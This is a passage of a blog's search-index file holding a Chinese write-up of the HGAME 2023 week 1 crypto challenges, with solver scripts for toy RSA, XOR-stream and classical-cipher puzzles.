      <categories>
          
          <category> ctf | wp </category>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> match </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 hgame week1 Crypto篇wp</title>
      <link href="/2023/01/11/2023%20hgame%20week1%20Crypto%E7%AF%87wp/"/>
      <url>/2023/01/11/2023%20hgame%20week1%20Crypto%E7%AF%87wp/</url>
      
        <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="1、RSA"><a href="#1、RSA" class="headerlink" title="1、RSA"></a>1、RSA</h3><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>很简单，在<a href="http://factordb.com/">factordb.com</a>直接分解n，得到p，q，计算即可</p><h3 id="2、Be-Stream"><a href="#2、Be-Stream" class="headerlink" title="2、Be Stream"></a>2、Be Stream</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><blockquote><p>很喜欢李小龙先生的一句话”Be water my friend”，但是这条小溪的水好像太多了。</p></blockquote><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">bytes</span></span><br><span class="line"> </span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (stream(i-<span class="number">2</span>)*<span class="number">7</span> + stream(i-<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">enc = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>) % <span class="number">256</span></span><br><span class="line">    enc += <span class="built_in">bytes</span>([water ^ flag[i]])</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment"># b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h4><p>通过题目代码可知：使用get_steam()函数计算出water，然后在用water与enc异或拼接，即可得到flag</p><p>但是</p><p><img src="https://s1.vika.cn/space/2023/02/07/dcce9d571bcb4b15a12c9834dda5093a" alt="image-20230207190228522"></p><p>可以知道该函数是通过递归进行定义的，跑不出来，我们需要优化</p><p>有些好笑的是，比赛的时候看到群里的一位师傅使用chatgpt对本题进行优化，结果跑了几天才跑出来:rofl:</p><p>我们可以使用循环来替代递归，这种方法是可以得到flag的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a, b = key[<span class="number">0</span>], key[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i):</span><br><span class="line">            a, b = b, (a * <span class="number">7</span> + b * <span class="number">4</span>) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">dec = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    water = stream((i // <span class="number">2</span>) ** <span class="number">6</span>) % <span class="number">256</span></span><br><span class="line">    dec += <span class="built_in">bytes</span>([water ^ enc[i]])</span><br><span class="line">    <span class="built_in">print</span>(dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有一位师傅的博客是使用矩阵解的，速度很快，感兴趣的可以看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">enc = <span class="built_in">list</span>(<span class="string">b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span>)</span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">s0, s1 = key</span><br><span class="line"></span><br><span class="line">M = matrix(Zmod(<span class="number">256</span>), [[<span class="number">4</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">A = vector(Zmod(<span class="number">256</span>), [s1,s0])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (M^(x-<span class="number">1</span>)*A)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>)</span><br><span class="line">    flag += [(<span class="built_in">int</span>(water) ^^ <span class="built_in">int</span>(enc[i])) % <span class="number">128</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/#Be-Stream">HGAME 2023 Week 1 | Lazzaro (lazzzaro.github.io)</a></p><h3 id="3、神秘的电话"><a href="#3、神秘的电话" class="headerlink" title="3、神秘的电话"></a>3、神秘的电话</h3><h4 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h4><p>两个加密文件</p><p>一个进行base64解密得到：</p><blockquote><p>⼏个星期前，我们收到⼀个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什</p><p>么。唯⼀知道的信息是关于密钥的：“只有倒着翻过⼗⼋层的篱笆才能抵达北欧神话的终点”。</p></blockquote><p>可以得到关键字：倒着，篱笆</p><p>另一个文件时摩斯密码，解密后得到<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>字符串逆序 + 栅栏密码（18栏） 得到：<code>rmocfhm_wo_ybipe2023_ril_hnajg_katfqqg</code></p><p>后面我就不会了，不过看到2023也可以猜到flag是什么，尝试了很多遍，得到了几个单词，比如</p><p><code>welcome</code>  <code>2023</code>   <code>hgame</code>  <code>hack</code></p><p>得到flag：hgame{welcome_to_hgame2023_and_enjoy_hacking}</p>]]></content>
      
      
      <categories>
          
          <category> ctf | wp </category>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> match </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
